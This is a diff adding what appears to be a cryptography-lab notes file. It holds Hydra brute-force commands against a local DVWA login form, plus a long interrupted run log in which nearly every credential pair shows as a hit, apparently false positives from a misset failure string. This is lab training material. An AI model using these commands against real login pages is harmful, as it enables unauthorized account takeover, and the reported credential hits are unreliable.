@@ -1,0 +1,157 @@
+
+# Ejecuta y guarda la salida
+hydra -L usuarios.txt -P claves.txt 127.0.0.1 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed" -V 2>&1 | tee hydra_output.txt
+
+# inspecciona
+curl -s -D - 'http://127.0.0.1/DVWA/login.php' -d 'username=bad&password=bad&Login=Login' | sed -n '1,200p'
+
+hydra -L usuarios.txt -P claves.txt 127.0.0.1 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login" -f -o found.txt -V
+cat found.txt
+
+hydra -L usuarios.txt -P claves.txt 127.0.0.1 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed" -o found.txt -V
+cat found.txt
+
+# Consulto solo los casos exitosos en el output generado
+grep '\[http-post-form\] host:' hydra_output.txt \
+  | sed -E 's/.*login: *([^ ]+) *password: *(.*)/\1:\2/' \
+  | sort -u
+
+
+
+
+hydra -L usuarios.txt -P claves.txt 127.0.0.1 http-post-form \
+"/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed" \
+-o hydra_output.txt -V
+
+
+
+
+
+
+
+
+diego@diego-IdeaPad-3-14ALC6:~/Documentos/GitHub/Lab_Criptografia/Lab 2$ hydra -L usuarios.txt -P claves.txt 127.0.0.1 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed" -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 20:40:34
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 625292 login tries (l:701/p:892), ~39081 tries per task
+[DATA] attacking http-post-form://127.0.0.1:80/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=^TOKEN^:F=Login failed
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "root" - 1 of 625292 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "admin" - 2 of 625292 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "1234" - 3 of 625292 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "user" - 4 of 625292 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "Administrator" - 5 of 625292 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "administrador" - 6 of 625292 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "12345" - 7 of 625292 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "123456" - 8 of 625292 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "1234567" - 9 of 625292 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "12345678" - 10 of 625292 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "temporal" - 11 of 625292 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "0000" - 12 of 625292 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "00000" - 13 of 625292 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "000000" - 14 of 625292 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "passwd" - 15 of 625292 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "password" - 16 of 625292 [child 15] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: root
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "root" - 893 of 625292 [child 0] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: Administrator
+[80][http-post-form] host: 127.0.0.1   login: root   password: administrador
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin" - 894 of 625292 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "1234" - 895 of 625292 [child 5] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: user
+[80][http-post-form] host: 127.0.0.1   login: root   password: password
+[80][http-post-form] host: 127.0.0.1   login: root   password: 1234
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "user" - 896 of 625292 [child 3] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: 12345
+[80][http-post-form] host: 127.0.0.1   login: root   password: 123456
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Administrator" - 897 of 625292 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "administrador" - 898 of 625292 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345" - 899 of 625292 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 900 of 625292 [child 7] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: admin
+[80][http-post-form] host: 127.0.0.1   login: root   password: 1234567
+[80][http-post-form] host: 127.0.0.1   login: root   password: 12345678
+[80][http-post-form] host: 127.0.0.1   login: root   password: temporal
+[80][http-post-form] host: 127.0.0.1   login: root   password: 000000
+[80][http-post-form] host: 127.0.0.1   login: root   password: passwd
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "1234567" - 901 of 625292 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345678" - 902 of 625292 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "temporal" - 903 of 625292 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "0000" - 904 of 625292 [child 10] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: 00000
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "00000" - 905 of 625292 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "000000" - 906 of 625292 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "passwd" - 907 of 625292 [child 12] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: root   password: 0000
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 908 of 625292 [child 11] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: root
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "root" - 1785 of 625292 [child 0] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: admin
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "admin" - 1786 of 625292 [child 4] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 1234
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "1234" - 1787 of 625292 [child 5] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 12345
+[80][http-post-form] host: 127.0.0.1   login: admin   password: user
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "user" - 1788 of 625292 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "Administrator" - 1789 of 625292 [child 3] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: administrador
+[80][http-post-form] host: 127.0.0.1   login: admin   password: temporal
+[80][http-post-form] host: 127.0.0.1   login: admin   password: Administrator
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 1234567
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "administrador" - 1790 of 625292 [child 2] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 123456
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "12345" - 1791 of 625292 [child 9] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: password
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "123456" - 1792 of 625292 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "1234567" - 1793 of 625292 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "12345678" - 1794 of 625292 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "temporal" - 1795 of 625292 [child 11] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 000000
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "0000" - 1796 of 625292 [child 14] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 12345678
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "00000" - 1797 of 625292 [child 8] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 0000
+[80][http-post-form] host: 127.0.0.1   login: admin   password: passwd
+[80][http-post-form] host: 127.0.0.1   login: admin   password: 00000
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "000000" - 1798 of 625292 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "passwd" - 1799 of 625292 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "1234" - pass "password" - 1800 of 625292 [child 13] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 1234
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: root
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: admin
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "root" - 2677 of 625292 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "admin" - 2678 of 625292 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "1234" - 2679 of 625292 [child 4] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: Administrator
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "user" - 2680 of 625292 [child 3] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: user
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 1234567
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Administrator" - 2681 of 625292 [child 6] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 12345678
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 12345
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 0000
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "administrador" - 2682 of 625292 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "12345" - 2683 of 625292 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "123456" - 2684 of 625292 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "1234567" - 2685 of 625292 [child 14] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: administrador
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "12345678" - 2686 of 625292 [child 2] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: temporal
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 123456
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 00000
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: 000000
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "temporal" - 2687 of 625292 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "0000" - 2688 of 625292 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "00000" - 2689 of 625292 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "000000" - 2690 of 625292 [child 10] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: user   password: admin
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: passwd
+[ATTEMPT] target 127.0.0.1 - login "Administrator" - pass "root" - 3569 of 625292 [child 0] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: user   password: root
+[ATTEMPT] target 127.0.0.1 - login "Administrator" - pass "admin" - 3570 of 625292 [child 12] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: 1234   password: password
+[ATTEMPT] target 127.0.0.1 - login "Administrator" - pass "1234" - 3571 of 625292 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "Administrator" - pass "user" - 3572 of 625292 [child 13] (0/0)
+[80][http-post-form] host: 127.0.0.1   login: user   password: 1234
+[ATTEMPT] target 127.0.0.1 - login "Administrator" - pass "Administrator" - 3573 of 625292 [child 4] (0/0)
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
